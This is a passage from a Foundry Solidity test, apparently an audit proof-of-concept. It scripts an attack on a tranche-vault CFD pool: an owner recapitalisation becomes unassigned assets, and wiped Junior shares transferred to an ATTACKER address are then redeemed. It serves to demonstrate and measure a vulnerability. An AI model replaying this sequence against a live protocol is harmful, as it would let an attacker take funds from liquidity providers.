        uint256 originalShares = juniorVault.balanceOf(ORIGINAL_JUNIOR);
        address originalOwner = ORIGINAL_JUNIOR;
        vm.prank(ORIGINAL_JUNIOR);
        uint256 wipeId = juniorVault.requestRedeem(originalShares, originalOwner, originalOwner);
        vm.warp(pool.lpEpochStart(wipeId));
        pool.settleLpEpoch(0, 0);
        assertEq(pool.juniorPrincipal(), 0, "genuine trader win wiped Junior");
        assertGt(pool.seniorPrincipal(), 0, "Senior survives impaired");
        uint256 gap = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        assertGt(gap, 0, "real Senior recovery gap");
        vm.prank(ORIGINAL_JUNIOR);
        juniorVault.claimRedeemRefund(wipeId, ORIGINAL_JUNIOR, ORIGINAL_JUNIOR);
        settlementToken.mint(address(this), gap);
        settlementToken.approve(address(engine), gap);
        engine.recapitalizePool(gap);
        assertEq(pool.pendingRecapitalizationAssets(), gap, "owner contributes exact gap");

        _fundTrader(LOSER, 100_000e6);
        for (uint256 i; i < 5; ++i) {
            router.updateMarkPrice(_mockPythCurrentUpdateData(1e8));
            _trade(LOSER, CfdTypes.Side.LONG, 30_000e18, 20_000e6, 1e8, false);
            vm.warp(block.timestamp + 1 hours);
            router.updateMarkPrice(_mockPythCurrentUpdateData(110_000_000));
            _trade(LOSER, CfdTypes.Side.LONG, 30_000e18, 0, 110_000_000, true);
            if (i < 4) {
                vm.warp(block.timestamp + 1 hours);
            }
        }
        assertEq(pool.pendingRecapitalizationAssets(), gap);
        assertEq(pool.pendingTradingRevenueAssets(), 0, "ordinary revenue not queued");
        _finishCooldown(juniorVault, ORIGINAL_JUNIOR);
        vm.prank(ORIGINAL_JUNIOR);
        uint256 unassignedId =
            juniorVault.requestRedeem(originalShares, ORIGINAL_JUNIOR, ORIGINAL_JUNIOR);
        vm.warp(pool.lpEpochStart(unassignedId));
        pool.settleLpEpoch(0, 0);
        vm.prank(ORIGINAL_JUNIOR);
        juniorVault.claimRedeemRefund(unassignedId, ORIGINAL_JUNIOR, ORIGINAL_JUNIOR);
        emit log_named_uint("honest_unassigned", pool.unassignedAssets());
        assertGt(pool.unassignedAssets(), 10_000e6, "honest exact recap becomes ownerless");
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark());
        _finishCooldown(juniorVault, ORIGINAL_JUNIOR);
        assertEq(pool.juniorPrincipal(), 0, "Junior remains wiped before transfer");
        assertEq(juniorVault.maxWithdraw(ORIGINAL_JUNIOR), 0, "wiped shares have zero NAV");
        vm.prank(ORIGINAL_JUNIOR);
        juniorVault.transfer(ATTACKER, originalShares);
        _redeemSenior();
        emit log_named_uint("senior_after_exit", pool.seniorPrincipal());
        emit log_named_uint("unassigned_after_senior_exit", pool.unassignedAssets());
        assertLt(pool.seniorPrincipal(), 10e6, "only seed Senior remains");
    }

    function _redeemSenior() private {
        _finishCooldown(seniorVault, SENIOR_LP);
        uint256 shares = seniorVault.balanceOf(SENIOR_LP);
        vm.prank(SENIOR_LP);
        uint256 requestId = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
        vm.warp(pool.lpEpochStart(requestId));
        pool.settleLpEpoch(0, 0);
        uint256 claimable = seniorVault.claimableRedeemRequest(requestId, SENIOR_LP);
        assertGt(claimable, 0, "Senior can redeem before attack");
        vm.prank(SENIOR_LP);
        seniorVault.claimRedeem(requestId, claimable, SENIOR_LP, SENIOR_LP);
    }

    function _finishBranch(
        uint256 finalTime
    ) private returns (Branch memory branch) {
        vm.warp(finalTime);
        _trade(ATTACK_TRADER, CfdTypes.Side.LONG, 5000e18, 0, 1e8, true);
        _finishCooldown(juniorVault, ATTACKER);
        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        vm.warp(pool.lpEpochStart(requestId));
        pool.settleLpEpoch(0, 0);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        uint256 beforeBalance = settlementToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.claimRedeem(requestId, claimable, ATTACKER, ATTACKER);
        branch.attackerReceipt = settlementToken.balanceOf(ATTACKER) - beforeBalance;
        branch.unassignedBeforeAssignment = pool.unassignedAssets();
        branch.traderBalance = clearinghouse.balanceAssets(ATTACK_TRADER);
        branch.traderWallet = settlementToken.balanceOf(ATTACK_TRADER);
        branch.traderClaims = engine.totalTraderClaimBalanceAssets();
        branch.poolCashBeforeAssignment = pool.rawAssets();
        branch.ownerReceiverReceipt = _assignAndClaim();
    }

    function _assignAndClaim() private returns (uint256 receipt) {
        pool.assignUnassignedAssets(false, OWNER_RECEIVER);
        uint256 unlockTime =
            juniorVault.lastDepositTime(OWNER_RECEIVER) + juniorVault.DEPOSIT_COOLDOWN();
        vm.warp(unlockTime);
        uint256 shares = juniorVault.balanceOf(OWNER_RECEIVER);
        vm.prank(OWNER_RECEIVER);
        uint256 requestId = juniorVault.requestRedeem(shares, OWNER_RECEIVER, OWNER_RECEIVER);
        vm.warp(pool.lpEpochStart(requestId));
        pool.settleLpEpoch(0, 0);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, OWNER_RECEIVER);
        uint256 beforeBalance = settlementToken.balanceOf(OWNER_RECEIVER);
        vm.prank(OWNER_RECEIVER);
        juniorVault.claimRedeem(requestId, claimable, OWNER_RECEIVER, OWNER_RECEIVER);
        receipt = settlementToken.balanceOf(OWNER_RECEIVER) - beforeBalance;
    }

    function _finishCooldown(
        TrancheVault vault,
        address owner
    ) private {
        uint256 unlockTime = vault.lastDepositTime(owner) + vault.DEPOSIT_COOLDOWN();
        if (block.timestamp < unlockTime) {
            vm.warp(unlockTime);
        }
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool close
    ) private {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = (side == CfdTypes.Side.LONG) == close ? type(uint256).max : 1;
        request.isClose = close;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        OrderV3Types.ExecutionResult memory result =
            router.executeOrder(id, _mockPythUpdateData(price));
        assertEq(
            uint8(result.status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "public order executed"
        );
    }

}
```

